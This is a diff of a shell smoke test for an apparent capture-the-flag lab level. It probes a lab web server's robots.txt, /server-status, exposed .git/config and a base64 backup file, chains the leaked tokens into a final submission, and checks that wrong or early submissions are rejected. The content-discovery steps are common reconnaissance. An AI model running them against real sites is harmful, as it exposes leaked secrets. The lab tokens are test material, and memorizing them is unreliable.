@@ -1,50 +1,42 @@
 #!/bin/sh
 set -eu
-
-: "${FLAG_L09_ROBOTS:?smoke runner must inject expected flags}"
-: "${FLAG_L09_GITLEAK:?smoke runner must inject expected flags}"
-: "${FLAG_L09_BACKUP:?smoke runner must inject expected flags}"
-: "${FLAG_L09_FINAL:?smoke runner must inject expected flags}"
-
-base="http://web-archive:8080"
-
-assert_eq() {
-  if [ "$1" != "$2" ]; then
-    echo "smoke assertion failed: expected [$2] got [$1]" >&2
-    exit 1
-  fi
+base=http://web-archive:8080
+work=$(mktemp -d)
+status=$(curl -fsS "$base/server-status")
+robots=$(printf '%s\n' "$status" | sed -n 's/^robots_token=//p')
+test "$(printf '%s\n' "$status" | sed -n 's/^objective_flag=//p')" = "$FLAG_L09_ROBOTS"
+curl -fsS "$base/robots.txt" | grep -q '/server-status'
+git_config=$(curl -fsS "$base/.git/config")
+git_token=$(printf '%s\n' "$git_config" | sed -n 's/^git_token = //p')
+test "$(printf '%s\n' "$git_config" | sed -n 's/^objective_flag = //p')" = "$FLAG_L09_GITLEAK"
+backup_path=$(printf '%s\n' "$git_config" | sed -n 's/^backup = //p')
+curl -fsS "$base$backup_path" | base64 -d > "$work/config.json"
+test "$(jq -r .objective_flag "$work/config.json")" = "$FLAG_L09_BACKUP"
+backup=$(jq -r .backup_token "$work/config.json")
+artifact=$(jq -r .artifact "$work/config.json")
+curl -fsS "$base$artifact" -o "$work/access.log"
+log_hash=$(sha256sum "$work/access.log" | cut -d ' ' -f1)
+test "$log_hash" = "$(jq -r .sha256 "$work/config.json")"
+actor=$(awk '$5 == 200 && $4 ~ /^\/exports\// {print $1}' "$work/access.log")
+event=$(awk '$5 == 200 && $4 ~ /^\/exports\// {sub(/^\/exports\//, "", $4); print $4}' "$work/access.log")
+case_id=$(jq -r .case "$work/config.json")
+report() {
+  curl -sS -o "$work/report" -w '%{http_code}' -X POST \
+    --data-urlencode "robots=$robots" --data-urlencode "git=$git_token" \
+    --data-urlencode "backup=$backup" --data-urlencode "case=$case_id" \
+    --data-urlencode "actor=$1" --data-urlencode "event=$2" \
+    --data-urlencode "log_sha256=$3" "$base/final"
 }
-
-attempt=0
-until curl -fsS "$base/health" >/dev/null 2>&1; do
-  attempt=$((attempt + 1))
-  test "$attempt" -lt 30 || { echo "web archive did not become ready" >&2; exit 1; }
-  sleep 1
-done
-
-# 1) robots.txt breadcrumb -> /server-status
-curl -fsS "$base/robots.txt" | grep -q '^Disallow: /server-status$'
-status="$(curl -fsS "$base/server-status")"
-assert_eq "$(printf '%s' "$status" | sed -n 's/^robots_token=//p')" "index-quartz-09"
-assert_eq "$(printf '%s' "$status" | sed -n 's/^objective_flag=//p')" "$FLAG_L09_ROBOTS"
-
-# 2) exposed .git/config (discovered from robots Disallow /.git/)
-git_config="$(curl -fsS "$base/.git/config")"
-assert_eq "$(printf '%s' "$git_config" | sed -n 's/.*git_token = //p')" "repo-ember-33"
-assert_eq "$(printf '%s' "$git_config" | sed -n 's/.*objective_flag = //p')" "$FLAG_L09_GITLEAK"
-
-# 3) leftover backup file (hinted by the index HTML comment)
-curl -fsS "$base/" | grep -q 'config.php.bak'
-backup="$(curl -fsS "$base/config.php.bak")"
-assert_eq "$(printf '%s' "$backup" | sed -n 's/.*backup_token=//p')" "stale-onyx-58"
-assert_eq "$(printf '%s' "$backup" | sed -n 's/.*objective_flag=//p')" "$FLAG_L09_BACKUP"
-
-# 4) chain the three tokens
-final="$(curl -fsS -X POST \
-  --data-urlencode 'robots=index-quartz-09' \
-  --data-urlencode 'git=repo-ember-33' \
-  --data-urlencode 'backup=stale-onyx-58' \
-  "$base/final" | sed -n 's/^final_flag=//p')"
-assert_eq "$final" "$FLAG_L09_FINAL"
-
-echo "09-content-discovery smoke: PASS"
+# Wrong actor, denied event, altered hash, and missing evidence are rejected.
+test "$(report scanner "$event" "$log_hash")" = "403"
+! grep -q 'RLAB{' "$work/report"
+test "$(report "$actor" DECOY-901 "$log_hash")" = "403"
+test "$(report "$actor" "$event" incorrect-hash)" = "403"
+test "$(curl -sS -o "$work/early" -w '%{http_code}' -X POST "$base/final")" = "403"
+! grep -q 'RLAB{' "$work/early"
+# Public benign pages disclose no stage flags.
+curl -fsS "$base/help" > "$work/help"
+! grep -q 'RLAB{' "$work/help"
+test "$(report "$actor" "$event" "$log_hash")" = "200"
+test "$(sed -n 's/^final_flag=//p' "$work/report")" = "$FLAG_L09_FINAL"
+echo "09 smoke: discovery, decoding, integrity and export correlation passed"
